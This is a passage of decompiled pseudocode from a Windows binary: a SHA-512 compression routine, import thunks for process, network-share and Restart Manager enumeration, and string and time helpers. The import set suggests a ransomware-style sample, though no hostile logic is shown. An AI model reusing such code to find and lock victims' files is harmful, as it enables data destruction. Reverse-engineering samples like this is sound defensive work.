  unsigned __int64 v182; // [rsp+A8h] [rbp-58h]
  unsigned __int64 v183; // [rsp+B0h] [rbp-50h]
  unsigned __int64 v184; // [rsp+B8h] [rbp-48h]
  unsigned __int64 v185; // [rsp+C0h] [rbp-40h]
  unsigned __int64 v186; // [rsp+C8h] [rbp-38h]
  unsigned __int64 v187; // [rsp+D0h] [rbp-30h]
  unsigned __int64 v188; // [rsp+D8h] [rbp-28h]
  unsigned __int64 v189; // [rsp+E0h] [rbp-20h]
  unsigned __int64 v190; // [rsp+E8h] [rbp-18h]
  _QWORD v191[2]; // [rsp+F0h] [rbp-10h]
  _QWORD v192[2]; // [rsp+100h] [rbp+0h]
  _QWORD v193[2]; // [rsp+110h] [rbp+10h]
  _QWORD v194[2]; // [rsp+120h] [rbp+20h]
  _QWORD v195[80]; // [rsp+130h] [rbp+30h]
  unsigned int v197; // [rsp+3D0h] [rbp+2D0h]
  unsigned int v198; // [rsp+3D0h] [rbp+2D0h]
  unsigned int v199; // [rsp+3D8h] [rbp+2D8h]
  unsigned int v200; // [rsp+3D8h] [rbp+2D8h]

  v2 = 16;
  v3 = a2[1];
  *(_OWORD *)v192 = *a2;
  v4 = a2[2];
  *(_OWORD *)v193 = v3;
  v5 = a2[3];
  *(_OWORD *)v194 = v4;
  v6 = a2[4];
  *(_OWORD *)v195 = v5;
  v7 = a2[5];
  *(_OWORD *)&v195[2] = v6;
  v8 = a2[6];
  *(_OWORD *)&v195[4] = v7;
  v9 = a2[7];
  *(_OWORD *)&v195[6] = v8;
  *(_OWORD *)&v195[8] = v9;
  do
  {
    v10 = v191[v2];
    v11 = *((_DWORD *)&v178 + 2 * v2);
    v12 = HIDWORD(v191[v2]);
    v13 = *((_DWORD *)&v178 + 2 * v2 + 1);
    v14 = *((_DWORD *)&v177 + 2 * v2 + 1);
    v15 = *((_DWORD *)&v186 + 2 * v2 + 1);
    v16 = ((v10 << 13) | (v12 >> 19)) ^ ((v10 << 26) | (v12 >> 6)) ^ ((v10 >> 29) | (8 * v12));
    v17 = ((v11 << 24) | (v13 >> 8)) ^ ((v11 << 25) | (v13 >> 7)) ^ ((v11 << 31) | (v13 >> 1));
    v18 = v17 + v15 + v16;
    HIDWORD(v192[v2]) = v14 + v18;
    v19 = v17 + v16 < v17;
    v20 = HIDWORD(v191[v2 + 1]);
    v21 = (v18 < v15)
        + *((_DWORD *)&v186 + 2 * v2)
        + *((_DWORD *)&v177 + 2 * v2)
        + ((v11 >> 7) ^ ((v11 >> 1) | (v13 << 31)) ^ ((v11 >> 8) | (v13 << 24)))
        + ((v10 >> 6) ^ ((8 * v10) | (v12 >> 29)) ^ ((v10 >> 19) | (v12 << 13)));
    v22 = *((_DWORD *)&v179 + 2 * v2 + 1);
    v23 = *((_DWORD *)&v179 + 2 * v2);
    v24 = v19 + (v14 + v18 < v14) + v21;
    v25 = *((_DWORD *)&v187 + 2 * v2 + 1);
    LODWORD(v192[v2]) = v24;
    v26 = v191[v2 + 1];
    v27 = ((v26 << 13) | (v20 >> 19)) ^ ((v26 << 26) | (v20 >> 6)) ^ ((v26 >> 29) | (8 * v20));
    v28 = ((v23 << 24) | (v22 >> 8)) ^ ((v23 << 25) | (v22 >> 7)) ^ ((v23 << 31) | (v22 >> 1));
    v29 = v28 + v25 + v27;
    HIDWORD(v192[v2 + 1]) = v13 + v29;
    LODWORD(v192[v2 + 1]) = (v29 < v25)
                          + *((_DWORD *)&v187 + 2 * v2)
                          + ((v23 >> 7) ^ ((v23 >> 1) | (v22 << 31)) ^ ((v23 >> 8) | (v22 << 24)))
                          + ((v26 >> 6) ^ ((8 * v26) | (v20 >> 29)) ^ ((v26 >> 19) | (v20 << 13)))
                          + v11
                          + (v13 + v29 < v13)
                          + (v28 + v27 < v28);
    v2 += 2;
  }
  while ( v2 != 80 );
  v30 = *a1;
  v31 = a1[1];
  v32 = a1[3];
  v33 = a1[4];
  v34 = a1[6];
  v35 = a1[2];
  v36 = a1[5];
  v37 = a1[7];
  v176 = HIDWORD(*a1);
  v178 = HIDWORD(v31);
  v38 = HIDWORD(v34);
  v177 = HIDWORD(v35);
  v179 = HIDWORD(v32);
  v39 = HIDWORD(v37);
  v40 = HIDWORD(v33);
  v180 = v30;
  v41 = HIDWORD(v33);
  v161 = v30;
  v149 = v30;
  v42 = 0;
  v181 = v31;
  v153 = v31;
  v183 = v32;
  v185 = v33;
  v186 = HIDWORD(v36);
  v189 = v34;
  v148 = v33;
  v43 = HIDWORD(v34);
  v197 = v34;
  v44 = HIDWORD(v36);
  v151 = v31;
  v45 = v40;
  v142 = v32;
  v46 = v40;
  v165 = HIDWORD(v36);
  v169 = HIDWORD(v36);
  v170 = HIDWORD(v36);
  v157 = 0;
  v182 = v35;
  v184 = v40;
  v187 = v36;
  v188 = v38;
  v191[0] = v37;
  v190 = HIDWORD(v37);
  v158 = v40;
  v173 = v40;
  v174 = v40;
  v144 = v36;
  v175 = HIDWORD(v37);
  v146 = v37;
  v199 = v35;
  v166 = v40;
  v160 = v38;
  v167 = v38;
  v168 = v40;
  v171 = v40;
  v172 = v40;
  do
  {
    v47 = v158 & v44 ^ v43 & ~v46;
    v48 = (v45 >> 14) | ((_DWORD)v148 << 18);
    v49 = HIDWORD(qword_140002CB0[v42]);
    v50 = HIDWORD(v192[v42]);
    v51 = v48 ^ (((unsigned int)v40 >> 18) | ((_DWORD)v148 << 14)) ^ ((v41 << 23) | ((unsigned int)v148 >> 9));
    v52 = v51 + v49 + v47;
    v53 = v50 + v52 + v39;
    v54 = (v50 + v52 < v50)
        + (v53 < v175)
        + LODWORD(v192[v157])
        + LODWORD(qword_140002CB0[v157])
        + (v148 & v144 ^ v197 & ~(_DWORD)v148)
        + (((v174 >> 9) | ((_DWORD)v148 << 23)) ^ ((v173 << 14) | ((unsigned int)v148 >> 18)) ^ (v148 >> 14))
        + v146
        + (v52 < v49)
        + (v47 + v51 < v47);
    v55 = ((16 * v149) | ((unsigned int)v176 >> 28))
        ^ ((v149 >> 2) | ((_DWORD)v176 << 30))
        ^ (((_DWORD)v176 << 25) | (v149 >> 7));
    v56 = v53 + v179;
    v57 = v176 & v178 ^ v177 & (v176 ^ v178);
    v147 = v142 + (v53 + (unsigned int)v179 < (unsigned int)v179) + v54;
    v143 = v57 + v53 + v55;
    HIDWORD(v148) = (v143 < v53)
                  + (v149 & v151 ^ v199 & (v149 ^ v151))
                  + (v57 + v55 < v55)
                  + v54
                  + (((16 * v176) | (v149 >> 28))
                   ^ (((unsigned int)v176 >> 2) | (v149 << 30))
                   ^ ((v149 << 25) | ((unsigned int)v176 >> 7)));
    v58 = (((v53 + (unsigned int)v179) >> 14) | (v147 << 18))
        ^ (((v53 + (unsigned int)v179) >> 18) | (v147 << 14))
        ^ (((v53 + (_DWORD)v179) << 23) | (v147 >> 9));
    v59 = v166 & (v53 + v179) ^ v165 & ~(v53 + v179);
    v60 = HIDWORD(qword_140002CB0[v157 + 1]);
    v61 = HIDWORD(v192[v157 + 1]);
    v62 = v58 + v60 + v59;
    v63 = v61 + v62 + v160;
    v64 = (v61 + v62 < v61)
        + (v63 < v167)
        + LODWORD(v192[v157 + 1])
        + LODWORD(qword_140002CB0[v157 + 1])
        + (v148 & v147 ^ v144 & ~v147)
        + (((v56 >> 9) | (v147 << 23)) ^ ((v56 << 14) | (v147 >> 18)) ^ ((v56 << 18) | (v147 >> 14)))
        + v197
        + (v62 < v60)
        + (v59 + v58 < v59);
    v65 = ((v143 << 30) | (HIDWORD(v148) >> 2))
        ^ ((v143 >> 28) | (16 * HIDWORD(v148)))
        ^ ((v143 << 25) | (HIDWORD(v148) >> 7));
    v66 = v176 & v178 ^ (v176 ^ v178) & v143;
    v67 = v63 + v177;
    v68 = v66 + v63 + v65;
    v198 = v68;
    v155 = v199 + (v63 + (unsigned int)v177 < (unsigned int)v177) + v64;
    v200 = (v68 < v63)
         + (v149 & v151 ^ (v161 ^ v153) & HIDWORD(v148))
         + (v66 + v65 < v65)
         + v64
         + (((16 * v143) | (HIDWORD(v148) >> 28))
          ^ ((v143 >> 7) | (HIDWORD(v148) << 25))
          ^ ((HIDWORD(v148) << 30) | (v143 >> 2)));
    v69 = ((v67 >> 14) | (v155 << 18)) ^ ((v67 >> 18) | (v155 << 14)) ^ ((v67 << 23) | (v155 >> 9));
    v70 = v67 & v56 ^ v168 & ~v67;
    v71 = HIDWORD(qword_140002CB0[v157 + 2]);
    v72 = HIDWORD(v193[v157]);
    v73 = v69 + v71 + v70;
    v74 = v72 + v73 + v169;
    v75 = (v70 + v69 < v70)
        + (v73 < v71)
        + (v72 + v73 < v72)
        + LODWORD(v193[v157])
        + LODWORD(qword_140002CB0[v157 + 2])
        + (v155 & v147 ^ v148 & ~v155)
        + (((v67 >> 9) | (v155 << 23)) ^ ((v67 << 14) | (v155 >> 18)) ^ ((v67 << 18) | (v155 >> 14)))
        + v144
        + (v74 < v170);
    v76 = ((v68 << 30) | (v200 >> 2)) ^ ((v68 >> 28) | (16 * v200)) ^ ((v68 << 25) | (v200 >> 7));
    v77 = v143 & v176 ^ v68 & (v176 ^ v143);
    v78 = v74 + v178;
    v154 = v151 + (v74 + (unsigned int)v178 < (unsigned int)v178) + v75;
    v79 = v77 + v74 + v76;
    v145 = v79;
    v80 = v154;
    v159 = (v79 < v74)
         + (HIDWORD(v148) & v149 ^ v200 & (v149 ^ HIDWORD(v148)))
         + (v77 + v76 < v76)
         + v75
         + (((v198 >> 2) | (v200 << 30)) ^ ((16 * v198) | (v200 >> 28)) ^ ((v200 << 25) | (v198 >> 7)));
    v81 = ((v78 >> 14) | (v80 << 18)) ^ ((v78 >> 18) | (v80 << 14)) ^ ((v78 << 23) | (v80 >> 9));
    v82 = v78 & v67 ^ v56 & ~v78;
    v83 = HIDWORD(qword_140002CB0[v157 + 3]);
    v84 = HIDWORD(v193[v157 + 1]);
    v85 = v81 + v83 + v82;
    v86 = v84 + v85 + v171;
    v87 = (v82 + v81 < v82)
        + (v84 + v85 < v84)
        + (v86 < v172)
        + LODWORD(v193[v157 + 1])
        + LODWORD(qword_140002CB0[v157 + 3])
        + (v80 & v155 ^ v147 & ~v80)
        + (((v78 >> 9) | (v80 << 23)) ^ ((v78 << 14) | (v80 >> 18)) ^ ((v78 << 18) | (v80 >> 14)))
        + v148
        + (v85 < v83);
    v88 = ((v79 << 30) | (v159 >> 2)) ^ ((v79 >> 28) | (16 * v159)) ^ ((v79 << 25) | (v159 >> 7));
    v89 = v198 & v143 ^ v79 & (v143 ^ v198);
    v90 = v86 + v176;
    v152 = v149 + (v86 + (unsigned int)v176 < (unsigned int)v176) + v87;
    v91 = v89 + v86 + v88;
    LODWORD(v148) = v91;
    v162 = (v91 < v86)
         + (v200 & HIDWORD(v148) ^ v159 & (v200 ^ HIDWORD(v148)))
         + (v89 + v88 < v88)
         + v87
         + (((v145 >> 2) | (v159 << 30)) ^ ((16 * v145) | (v159 >> 28)) ^ ((v145 >> 7) | (v159 << 25)));
    v92 = (((v86 + (unsigned int)v176) >> 14) | (v152 << 18))
        ^ (((v86 + (unsigned int)v176) >> 18) | (v152 << 14))
        ^ (((v86 + (_DWORD)v176) << 23) | (v152 >> 9));
    v93 = (v86 + v176) & v78 ^ v67 & ~(v86 + v176);
    v94 = HIDWORD(qword_140002CB0[v157 + 4]);
    v95 = HIDWORD(v194[v157]);
    v96 = v92 + v94 + v93;
    v97 = v95 + v96 + v56;
    v98 = (v93 + v92 < v93)
        + (v95 + v96 < v95)
        + (v97 < v56)
        + LODWORD(v194[v157])
        + LODWORD(qword_140002CB0[v157 + 4])
        + (v152 & v154 ^ v155 & ~v152)
        + (((v90 >> 9) | (v152 << 23)) ^ ((v90 << 14) | (v152 >> 18)) ^ ((v90 << 18) | (v152 >> 14)))
        + v147
        + (v96 < v94);
    v99 = ((v91 << 30) | (v162 >> 2)) ^ ((v91 >> 28) | (16 * v162)) ^ ((v91 << 25) | (v162 >> 7));
    v100 = v198 & v145 ^ v91 & (v145 ^ v198);
    v150 = v143 + v97;
    v146 = (v143 + v97 < v143) + v98 + HIDWORD(v148);
    HIDWORD(v148) = v100 + v97 + v99;
    LODWORD(v179) = HIDWORD(v148);
    v142 = (HIDWORD(v148) < v97)
         + (v200 & v159 ^ v162 & (v200 ^ v159))
         + (v100 + v99 < v99)
         + v98
         + (((16 * v148) | (v162 >> 28))
          ^ (((unsigned int)v148 >> 7) | (v162 << 25))
          ^ ((v162 << 30) | ((unsigned int)v148 >> 2)));
    v101 = ((v150 >> 14) | (v146 << 18)) ^ ((v150 >> 18) | (v146 << 14)) ^ ((v150 << 23) | (v146 >> 9));
    v102 = v150 & v90 ^ v78 & ~v150;
    v103 = HIDWORD(qword_140002CB0[v157 + 5]);
    v104 = HIDWORD(v194[v157 + 1]);
    v105 = v101 + v103 + v102;
    v106 = v104 + v105 + v67;
    v107 = (v102 + v101 < v102)
         + (v104 + v105 < v104)
         + LODWORD(v194[v157 + 1])
         + LODWORD(qword_140002CB0[v157 + 5])
         + (v146 & v152 ^ v154 & ~v146)
         + (((v150 >> 9) | (v146 << 23)) ^ ((v150 << 14) | (v146 >> 18)) ^ ((v150 << 18) | (v146 >> 14)))
         + v155
         + (v105 < v103)
         + (v106 < v67);
    v108 = ((HIDWORD(v148) << 30) | (v142 >> 2))
         ^ ((HIDWORD(v148) >> 28) | (16 * v142))
         ^ ((HIDWORD(v148) << 25) | (v142 >> 7));
    v109 = v148 & v145 ^ HIDWORD(v148) & (v145 ^ v148);
    v160 = v198 + v106;
    v197 = (v198 + v106 < v198) + v107 + v200;
    v156 = v109 + v106 + v108;
    LODWORD(v177) = v156;
    v199 = (v156 < v106)
         + (v162 & v159 ^ v142 & (v162 ^ v159))
         + (v109 + v108 < v108)
         + v107
         + (((16 * HIDWORD(v148)) | (v142 >> 28))
          ^ ((HIDWORD(v148) >> 7) | (v142 << 25))
          ^ ((v142 << 30) | (HIDWORD(v148) >> 2)));
    v110 = ((v160 >> 14) | (v197 << 18)) ^ ((v160 >> 18) | (v197 << 14)) ^ ((v160 << 23) | (v197 >> 9));
    v111 = v160 & v150 ^ v90 & ~v160;
    v112 = HIDWORD(qword_140002CB0[v157 + 6]);
    v113 = HIDWORD(v195[v157]);
    v114 = v110 + v112 + v111;
    v115 = v113 + v114 + v78;
    v116 = (v111 + v110 < v111)
         + (v113 + v114 < v113)
         + (v115 < v78)
         + LODWORD(v195[v157])
         + LODWORD(qword_140002CB0[v157 + 6])
         + (v197 & v146 ^ v152 & ~v197)
         + (((v160 >> 9) | (v197 << 23)) ^ ((v160 << 14) | (v197 >> 18)) ^ ((v160 << 18) | (v197 >> 14)))
         + v154
         + (v114 < v112);
    v117 = ((v156 << 30) | (v199 >> 2)) ^ ((v156 >> 28) | (16 * v199)) ^ ((v156 << 25) | (v199 >> 7));
    v118 = v148 & HIDWORD(v148) ^ v156 & (HIDWORD(v148) ^ v148);
    v44 = v145 + v115;
    v163 = v118 + v115 + v117;
    LODWORD(v178) = v163;
    v144 = (v145 + v115 < v145) + v116 + v159;
    v153 = (v163 < v115)
         + (v162 & v142 ^ v199 & (v142 ^ v162))
         + (v118 + v117 < v117)
         + v116
         + (((16 * v156) | (v199 >> 28)) ^ ((v156 >> 7) | (v199 << 25)) ^ ((v156 >> 2) | (v199 << 30)));
    v119 = ((v44 >> 14) | (v144 << 18)) ^ ((v44 >> 18) | (v144 << 14)) ^ ((v44 << 23) | (v144 >> 9));
    v120 = v160 & v44 ^ v150 & ~v44;
    v121 = HIDWORD(qword_140002CB0[v157 + 7]);
    v122 = HIDWORD(v195[v157 + 1]);
    v123 = v119 + v121 + v120;
    v124 = v90 + v122 + v123;
    v125 = (v122 + v123 < v122)
         + (v124 < v90)
         + LODWORD(v195[v157 + 1])
         + LODWORD(qword_140002CB0[v157 + 7])
         + (v197 & v144 ^ v146 & ~v144)
         + (((v44 >> 9) | (v144 << 23)) ^ ((v44 << 14) | (v144 >> 18)) ^ ((v44 << 18) | (v144 >> 14)))
         + v152
         + (v123 < v121)
         + (v120 + v119 < v120);
    v126 = ((v163 << 30) | (v153 >> 2)) ^ ((v163 >> 28) | (16 * v153)) ^ ((v163 << 25) | (v153 >> 7));
    v127 = HIDWORD(v148);
    v165 = v44;
    v169 = v44;
    v170 = v44;
    v128 = v156 & HIDWORD(v148) ^ v163 & (HIDWORD(v148) ^ v156);
    v39 = v150;
    v175 = v150;
    v41 = v91 + v124;
    v158 = v91 + v124;
    HIDWORD(v148) = v91 + v124;
    v173 = v91 + v124;
    LODWORD(v148) = ((unsigned int)v148 + v124 < (unsigned int)v148) + v125 + v162;
    v129 = v128 + v124 + v126 < v124;
    v164 = v128 + v124 + v126;
    LODWORD(v176) = v164;
    v174 = v41;
    v151 = v153;
    v166 = v91 + v124;
    v168 = v91 + v124;
    v171 = v91 + v124;
    v172 = v91 + v124;
    v130 = v128 + v126;
    v46 = v41;
    LODWORD(v40) = v41;
    v45 = v41;
    v42 = v157 + 8;
    v131 = (v199 & v142 ^ v153 & (v142 ^ v199))
         + (((v163 >> 2) | (v153 << 30)) ^ ((16 * v163) | (v153 >> 28)) ^ ((v163 >> 7) | (v153 << 25)))
         + (v130 < v126)
         + v125
         + v129;
    v157 = v42;
    v43 = v160;
    v161 = v131;
    v149 = v131;
    v167 = v160;
  }
  while ( v42 != 80 );
  v132 = v180;
  v133 = v184;
  v129 = v164 + HIDWORD(v180) < v164;
  *((_DWORD *)a1 + 1) = v164 + HIDWORD(v180);
  *(_DWORD *)a1 = v131 + v129 + v132;
  v134 = v181;
  v129 = v163 + HIDWORD(v181) < v163;
  *((_DWORD *)a1 + 3) = v163 + HIDWORD(v181);
  *((_DWORD *)a1 + 2) = v153 + v129 + v134;
  v135 = v182;
  v129 = v156 + HIDWORD(v182) < v156;
  *((_DWORD *)a1 + 5) = v156 + HIDWORD(v182);
  *((_DWORD *)a1 + 4) = v199 + v129 + v135;
  v136 = v183;
  v137 = v127 + HIDWORD(v183);
  *((_DWORD *)a1 + 7) = v127 + HIDWORD(v183);
  v138 = v41 + v133;
  *((_DWORD *)a1 + 9) = v138;
  *((_DWORD *)a1 + 8) = v148 + (v138 < v41) + (_DWORD)v185;
  v139 = v44 + v186;
  *((_DWORD *)a1 + 6) = v142 + (v137 < v127) + v136;
  *((_DWORD *)a1 + 11) = v139;
  *((_DWORD *)a1 + 10) = v144 + (v139 < v44) + (_DWORD)v187;
  v129 = v160 + (unsigned int)v188 < v160;
  *((_DWORD *)a1 + 13) = v160 + v188;
  *((_DWORD *)a1 + 12) = v197 + v129 + (_DWORD)v189;
  v140 = v39 + v190;
  *((_DWORD *)a1 + 15) = v39 + v190;
  result = v146 + (v140 < v39) + LODWORD(v191[0]);
  *((_DWORD *)a1 + 14) = result;
  return result;
}


// ----- CreateToolhelp32Snapshot @ 0x140019c34 -----
// attributes: thunk
HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)
{
  return __imp_CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}


// ----- Process32FirstW @ 0x140019c3a -----
// attributes: thunk
BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
{
  return __imp_Process32FirstW(hSnapshot, lppe);
}


// ----- Process32NextW @ 0x140019c40 -----
// attributes: thunk
BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
{
  return __imp_Process32NextW(hSnapshot, lppe);
}


// ----- Process32First @ 0x140019c46 -----
// attributes: thunk
BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
  return __imp_Process32First(hSnapshot, lppe);
}


// ----- Process32Next @ 0x140019c4c -----
// attributes: thunk
BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
  return __imp_Process32Next(hSnapshot, lppe);
}


// ----- NetShareEnum @ 0x140019c52 -----
// attributes: thunk
DWORD __stdcall NetShareEnum(
        LPWSTR servername,
        DWORD level,
        LPBYTE *bufptr,
        DWORD prefmaxlen,
        LPDWORD entriesread,
        LPDWORD totalentries,
        LPDWORD resume_handle)
{
  return __imp_NetShareEnum(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
}


// ----- NetApiBufferFree @ 0x140019c58 -----
// attributes: thunk
DWORD __stdcall NetApiBufferFree(LPVOID Buffer)
{
  return __imp_NetApiBufferFree(Buffer);
}


// ----- RmStartSession @ 0x140019c5e -----
// attributes: thunk
DWORD __stdcall RmStartSession(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[])
{
  return __imp_RmStartSession(pSessionHandle, dwSessionFlags, strSessionKey);
}


// ----- RmEndSession @ 0x140019c64 -----
// attributes: thunk
DWORD __stdcall RmEndSession(DWORD dwSessionHandle)
{
  return __imp_RmEndSession(dwSessionHandle);
}


// ----- RmRegisterResources @ 0x140019c6a -----
// attributes: thunk
DWORD __stdcall RmRegisterResources(
        DWORD dwSessionHandle,
        UINT nFiles,
        LPCWSTR rgsFileNames[],
        UINT nApplications,
        RM_UNIQUE_PROCESS rgApplications[],
        UINT nServices,
        LPCWSTR rgsServiceNames[])
{
  return __imp_RmRegisterResources(
           dwSessionHandle,
           nFiles,
           rgsFileNames,
           nApplications,
           rgApplications,
           nServices,
           rgsServiceNames);
}


// ----- RmGetList @ 0x140019c70 -----
// attributes: thunk
DWORD __stdcall RmGetList(
        DWORD dwSessionHandle,
        UINT *pnProcInfoNeeded,
        UINT *pnProcInfo,
        RM_PROCESS_INFO rgAffectedApps[],
        LPDWORD lpdwRebootReasons)
{
  return __imp_RmGetList(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);
}


// ----- WNetGetConnectionW @ 0x140019c76 -----
// attributes: thunk
DWORD __stdcall WNetGetConnectionW(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength)
{
  return __imp_WNetGetConnectionW(lpLocalName, lpRemoteName, lpnLength);
}


// ----- WNetOpenEnumW @ 0x140019c7c -----
// attributes: thunk
DWORD __stdcall WNetOpenEnumW(
        DWORD dwScope,
        DWORD dwType,
        DWORD dwUsage,
        LPNETRESOURCEW lpNetResource,
        LPHANDLE lphEnum)
{
  return __imp_WNetOpenEnumW(dwScope, dwType, dwUsage, lpNetResource, lphEnum);
}


// ----- WNetEnumResourceW @ 0x140019c82 -----
// attributes: thunk
DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize)
{
  return __imp_WNetEnumResourceW(hEnum, lpcCount, lpBuffer, lpBufferSize);
}


// ----- WNetCloseEnum @ 0x140019c88 -----
// attributes: thunk
DWORD __stdcall WNetCloseEnum(HANDLE hEnum)
{
  return __imp_WNetCloseEnum(hEnum);
}


// ----- __alloca_probe @ 0x140019ca0 -----
unsigned __int64 __fastcall _alloca_probe()
{
  unsigned __int64 result; // rax
  char *v1; // r10
  char *StackLimit; // r11
  char v3; // [rsp+18h] [rbp+8h] BYREF

  v1 = &v3 - result;
  if ( (unsigned __int64)&v3 < result )
    v1 = nullptr;
  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;
  if ( v1 < StackLimit )
  {
    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;
    do
    {
      StackLimit -= 4096;
      *StackLimit = 0;
    }
    while ( v1 != StackLimit );
  }
  return result;
}


// ----- sub_140019CF0 @ 0x140019cf0 -----
const __m128i *__fastcall sub_140019CF0(const __m128i *a1, const __m128i *a2)
{
  int v2; // esi
  const __m128i *v3; // rdi
  const __m128i *v4; // r9
  __m128i v6; // xmm3
  __m128i v7; // xmm1
  unsigned int v8; // eax
  const __m128i *v9; // r8
  const __m128i *i; // rax
  __m128i v11; // xmm0
  unsigned int v12; // ecx
  unsigned int v13; // edx
  __m128i v14; // xmm2
  __int8 v15; // cl
  int j; // r10d
  __int8 v17; // r8
  __m128i inserted; // xmm2
  __int8 v19; // r11
  __int8 *v20; // rdx
  __m128i v21; // xmm2
  __int8 v22; // bl
  char *v23; // rdx
  __m128i v24; // xmm2
  __int8 v25; // r8
  char *v26; // rdx
  __m128i v27; // xmm0
  unsigned __int8 v28; // cf
  const __m128i *v29; // rdx
  const __m128i *k; // r8
  __m128i v31; // xmm0
  __m128i v32; // xmm1
  unsigned __int8 v33; // sf

  v2 = a2->m128i_u8[0];
  v3 = a2;
  v4 = a1;
  if ( (_BYTE)v2 == 0 )
    return a1;
  if ( dword_140026610 < 2 )
  {
    v6 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(v2 | (unsigned int)(v2 << 8)), 0), 0);
    while ( 1 )
    {
      if ( ((unsigned __int16)v4 & 0xFFFu) > 0xFF0uLL )
        goto LABEL_9;
      v7 = _mm_loadu_si128(v4);
      v8 = _mm_movemask_epi8((__m128i)_mm_or_ps(
                                        (__m128)_mm_cmpeq_epi8(v7, (__m128i)0LL),
                                        (__m128)_mm_cmpeq_epi8(v7, v6)));
      if ( v8 != 0 )
      {
        _BitScanForward(&v8, v8);
        v4 = (const __m128i *)((char *)v4 + v8);
LABEL_9:
        if ( v4->m128i_i8[0] == 0 )
          return nullptr;
        if ( (_BYTE)v2 == v4->m128i_i8[0] )
        {
          v9 = v4;
          for ( i = v3; ; i = (const __m128i *)((char *)i + 1) )
          {
            while ( 2 )
            {
              if ( ((unsigned __int16)i & 0xFFFu) <= 0xFF0uLL && ((unsigned __int16)v9 & 0xFFFu) <= 0xFF0uLL )
              {
                v11 = _mm_loadu_si128(i);
                v12 = _mm_movemask_epi8((__m128i)_mm_or_ps(
                                                   (__m128)_mm_cmpeq_epi8(
                                                             _mm_cmpeq_epi8(_mm_loadu_si128(v9), v11),
                                                             (__m128i)0LL),
                                                   (__m128)_mm_cmpeq_epi8(v11, (__m128i)0LL)));
                if ( v12 == 0 )
                {
                  ++v9;
                  ++i;
                  continue;
                }
                _BitScanForward(&v13, v12);
                v9 = (const __m128i *)((char *)v9 + v13);
                i = (const __m128i *)((char *)i + v13);
              }
              break;
            }
            if ( i->m128i_i8[0] == 0 )
              return v4;
            if ( v9->m128i_i8[0] != i->m128i_i8[0] )
              break;
            v9 = (const __m128i *)((char *)v9 + 1);
          }
        }
        v4 = (const __m128i *)((char *)v4 + 1);
      }
      else
      {
        ++v4;
      }
    }
  }
  if ( ((unsigned __int16)a2 & 0xFFFu) > 0xFF0uLL )
  {
    v14 = 0;
    v15 = a2->m128i_i8[0];
    for ( j = 4; j != 0; --j )
    {
      v17 = v15;
      inserted = _mm_insert_epi8(_mm_srli_si128(v14, 1), v15, 15);
      if ( v15 != 0 )
        v15 = a2->m128i_i8[1];
      v19 = v15;
      v20 = &a2->m128i_i8[-(v17 == 0) + 1];
      v21 = _mm_insert_epi8(_mm_srli_si128(inserted, 1), v15, 15);
      if ( v15 != 0 )
        v15 = v20[1];
      v22 = v15;
      v23 = &v20[-(v19 == 0) + 1];
      v24 = _mm_insert_epi8(_mm_srli_si128(v21, 1), v15, 15);
      if ( v15 != 0 )
        v15 = v23[1];
      v25 = v15;
      v26 = &v23[-(v22 == 0) + 1];
      v14 = _mm_insert_epi8(_mm_srli_si128(v24, 1), v15, 15);
      if ( v15 != 0 )
        v15 = v26[1];
      a2 = (const __m128i *)&v26[-(v25 == 0) + 1];
    }
  }
  else
  {
    v14 = _mm_loadu_si128(a2);
  }
  while ( 1 )
  {
    while ( ((unsigned __int16)v4 & 0xFFFu) > 0xFF0uLL )
    {
      if ( v4->m128i_i8[0] == 0 )
        return nullptr;
      if ( v4->m128i_i8[0] == (_BYTE)v2 )
        goto LABEL_39;
LABEL_47:
      v4 = (const __m128i *)((char *)v4 + 1);
    }
    v27 = _mm_loadu_si128(v4);
    v28 = _mm_cmpistrc(v14, v27, 12);
    if ( v28 | _mm_cmpistrz(v14, v27, 12) )
      break;
    ++v4;
  }
  if ( !v28 )
    return nullptr;
  v4 = (const __m128i *)((char *)v4 + _mm_cmpistri(v14, v27, 12));
LABEL_39:
  v29 = v4;
  for ( k = v3; ; ++k )
  {
    while ( ((unsigned __int16)v29 & 0xFFFu) > 0xFF0uLL || ((unsigned __int16)k & 0xFFFu) > 0xFF0uLL )
    {
      if ( k->m128i_i8[0] == 0 )
        return v4;
      if ( v29->m128i_i8[0] != k->m128i_i8[0] )
        goto LABEL_47;
      v29 = (const __m128i *)((char *)v29 + 1);
      k = (const __m128i *)((char *)k + 1);
    }
    v31 = _mm_loadu_si128(v29);
    v32 = _mm_loadu_si128(k);
    v33 = _mm_cmpistrs(v32, v31, 12);
    if ( !_mm_cmpistro(v32, v31, 12) )
      goto LABEL_47;
    if ( v33 )
      break;
    ++v29;
  }
  return v4;
}


// ----- sub_140019FA0 @ 0x140019fa0 -----
__int64 __fastcall sub_140019FA0(__int64 *a1)
{
  __int64 v2; // rdx
  __int64 result; // rax
  struct _FILETIME SystemTimeAsFileTime; // [rsp+30h] [rbp+8h] BYREF

  SystemTimeAsFileTime = 0;
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v2 = (*(_QWORD *)&SystemTimeAsFileTime - 116444736000000000LL) / 10000000;
  if ( v2 > 0x793582AFFLL )
    v2 = -1;
  result = v2;
  if ( a1 != nullptr )
    *a1 = v2;
  return result;
}


// ----- sub_14001A020 @ 0x14001a020 -----
__int64 __fastcall sub_14001A020(__int64 a1, _OWORD *a2)
{
  __int64 v4; // rax
  int v5; // eax

  *(_BYTE *)(a1 + 24) = 0;
  if ( a2 != nullptr )
  {
    *(_OWORD *)(a1 + 8) = *a2;
    return a1;
  }
  else if ( dword_1400274CC != 0 )
  {
    v4 = sub_14001B014();
